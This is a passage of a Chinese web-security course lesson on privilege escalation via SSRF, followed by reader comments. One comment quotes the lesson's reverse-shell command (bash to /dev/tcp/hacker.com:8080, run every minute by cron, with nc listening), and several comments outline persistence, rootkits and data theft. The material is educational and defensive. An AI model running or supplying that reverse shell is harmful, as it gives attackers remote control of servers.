你好，我是何为舟。

我在Web安全的前6讲中，给你讲解了各种漏洞的产生和防护方法，比如：XSS、SQL注入、CSRF、SSRF和插件漏洞。除了这些漏洞之外，我也着重强调了一点，黑客善于通过“蛛丝马迹”推断出代码逻辑，然后发起攻击。学习了这些内容，在实际工作的过程中，我们其实就能基本避免大部分的Web安全问题了。但是，有一天，我又遇到了新的问题。

某一天，当我在进行日常审计的时候，突然发现内网有黑客的操作痕迹。于是，我马上对黑客的攻击路径进行溯源。最后发现黑客是通过某个应用的SSRF漏洞进入的。

之前我们提到过，SSRF通常用来作内网探测，那么黑客是如何通过SSRF拿到服务器权限的呢？更神奇的是，这个存在SSRF漏洞的应用，在排查的时候早已经下线了。那么，黑客是如何在漏洞已经下线的情况下，仍然能够进出内网呢？

## 权限提升：为什么黑客能通过SSRF拿到服务器权限？

首先，我们先来搞清楚，黑客是如何通过SSRF拿到服务器权限的。在解决这个问题之前，我们先来了解一个概念，权限提升。

在应用或系统中，黑客或者被黑客控制的用户，通常会通过漏洞攻击或者利用弱密码，获取到其他用户的权限。在获取了新的用户权限之后，黑客就能够以新用户的身份去窃取和篡改数据，进行非法的操作了。这就是**权限提升**（Privilege Escalation）。也就是说，黑客可以通过不断获取新的身份，来不断扩大（或者叫提升）自己的权限，不断扩大攻击影响，最终实现控制整个系统。
<div><strong>精选留言（16）</strong></div><ul>
<li><img src="https://static001.geekbang.org/account/avatar/00/11/47/31/f35367c8.jpg" width="30px"><span>小晏子</span> 👍（15） 💬（1）<div>有了内网服务器上的普通用户的权限，意味着我能拿到这个服务器上的代码，那么可以反编译他的代码获取代码里的各种漏洞，还可以进行内网探测，用ssh扫描所有内网服务器，试着进行权限提升，获取管理员权限，之后就好比在自己的服务上想干什么就干什么了，再做权限持久化，下个rootkit什么的方便下次进入。另外获取了他的代码也意味着能拿到他的数据存储的用户名密码，就可以获取他所有的用户数据等。</div>2020-01-03</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/12/65/c1/afcd981b.jpg" width="30px"><span>程序员二师兄</span> 👍（11） 💬（3）<div>“比如说，黑客在进入服务器之后，会留下下面这样一个脚本，让这个脚本，每分钟都执行一次：bash -i &gt;&amp; &#47;dev&#47;tcp&#47;hacker.com&#47;8080 0&gt;&amp;1这个脚本运行后，只要 hack.com 的 8080 端口打开，那么服务器就会通过 TCP 获取 8080 端口返回的命令并执行。因此，只要黑客任意时刻在 hacker.com 中监听 8080 端口（比如通过 nc -l 8080），就可以获得服务器定时送上来的命令执行权限。”
我是一个安全小白，这段话没太看明白，自己现在有两台服务器，想模拟上面讲的这个命令，这个要怎么操作呢？</div>2020-03-27</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/12/08/ab/caec7bca.jpg" width="30px"><span>humor</span> 👍（5） 💬（1）<div>既然Windows会有后门，那Linux会不会也有后门呀？我们怎么能够检测出来Linux是否有后门呢？</div>2020-01-14</li><br/><li><img src="http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKhuGLVRYZibOTfMumk53Wn8Q0Rkg0o6DzTicbibCq42lWQoZ8lFeQvicaXuZa7dYsr9URMrtpXMVDDww/132" width="30px"><span>hello</span> 👍（5） 💬（1）<div>老师，请教个问题，针对文件服务器，针对上传的文件类型进行白名单校验（魔数），然后存储时对文件进行了加密，那么针对文件服务器上传下载还有其它安全防护手段吗？对文件进行加密能否规避植入“后门”？</div>2020-01-03</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/eb/d3/b0dc0d00.jpg" width="30px"><span>二马</span> 👍（2） 💬（1）<div>1、在进行日常审计的时候，突然发现内网有黑客的操作痕迹。
请问是怎么发现操作痕迹的，有哪些痕迹，谢谢！

2、只要黑客任意时刻在 hacker.com 中监听 8080 端口（比如通过 nc -l 8080），就可以获得服务器定时送上来的命令执行权限。
内网的服务器主动访问互联网不是只允许访问指定网站嘛，或者是主动访问外部采取白名单的方式是否能有效预防这类后门攻击。
最小权限原则包括用户层面、程序（进程）层面和服务器（IP）层面，如这台服务器在内网横向能访问哪些服务器和被哪些服务器访问，纵向能访问哪些互联网服务器。</div>2020-01-04</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/85/49/585c69c4.jpg" width="30px"><span>皮特尔</span> 👍（1） 💬（1）<div>虽然限于篇幅，很多问题没有深入展开，但满满的都是干货。师傅领进门，修行在个人。给老师点赞👍</div>2020-05-22</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/eb/d3/b0dc0d00.jpg" width="30px"><span>二马</span> 👍（1） 💬（1）<div>老师好，在服务器性能异常才能发现，这属于被动发现，根据排查描述，是发现其攻击的轨迹，攻击过程是有蛛丝马迹的，可能是从日志分析出来的。那是否能做到事前发现，比如定期分析日志中ssh，数据库连接等高危操作端口的日志，对比排查服务器权限，是否有横向扩大的迹象。在这属于审计工作，实现是否困难。</div>2020-01-10</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/13/2f/f4/2dede51a.jpg" width="30px"><span>小老鼠</span> 👍（1） 💬（1）<div>如何测试系统中是否存在权限提升和持久化漏洞？</div>2020-01-05</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/1c/fb/19/583cd804.jpg" width="30px"><span>此心如水只東流</span> 👍（0） 💬（2）<div>老师，黑客进入系统后不会擦出痕迹吗？我们可以通过什么方法检查出系统有没有被黑客入侵呢？</div>2020-07-02</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/13/2f/f4/2dede51a.jpg" width="30px"><span>小老鼠</span> 👍（0） 💬（1）<div>点击挟持为什么不讲</div>2020-01-05</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/18/47/fd/895f0c27.jpg" width="30px"><span>Cy23</span> 👍（0） 💬（1）<div>实现细节不够详细，需要扩展研究攻击手段细节</div>2020-01-04</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/10/f6/0d/e16dff4e.jpg" width="30px"><span>瑞泉</span> 👍（5） 💬（6）<div>我一直没搞明白怎么才能获取普通用户权限，通过xss csrf sql注入感觉最多只能获取数据，请老师解惑，十分感谢！</div>2020-01-03</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/21/ad/9b/c84b436e.jpg" width="30px"><span>相见甚欢</span> 👍（0） 💬（0）<div>想请教下，有什么可以实现IDS（Intrusion Detection System，入侵检测系统）的软件吗？或者现在的大厂是怎么做这块的？</div>2021-01-25</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/12/d0/78/a11a999d.jpg" width="30px"><span>COOK</span> 👍（0） 💬（0）<div>原来IDS是从行为来分析威胁异常的。</div>2020-03-23</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/19/e3/d7/d7b3505f.jpg" width="30px"><span>官</span> 👍（0） 💬（0）<div>有了服务器权限，可以扫描整个内网的服务器，然后大概知道整个服务器的文件系统架构，后面真可以为所欲为了，比如可以加密某些重要代码敲诈公司，亦或者把库拖下来卖个人信息等等，最近这种案例真是屡见不鲜。</div>2020-03-19</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/16/51/50/f5f2a121.jpg" width="30px"><span>律飛</span> 👍（0） 💬（0）<div>有了内网服务器上的普通用户的权限，意味着我能登录服务器，可以用多种方法尝试提升权限，比如，通过活动目录、反编译代码、内网探测等多种方法。一旦获取管理员权限，就可以做权限持久化，放个Muma、下个rootkit什么的方便下次进入。另外获取了他的代码也意味着能拿到他的数据存储的用户名密码，就可以获取他所有的用户数据等。</div>2020-01-16</li><br/>
</ul>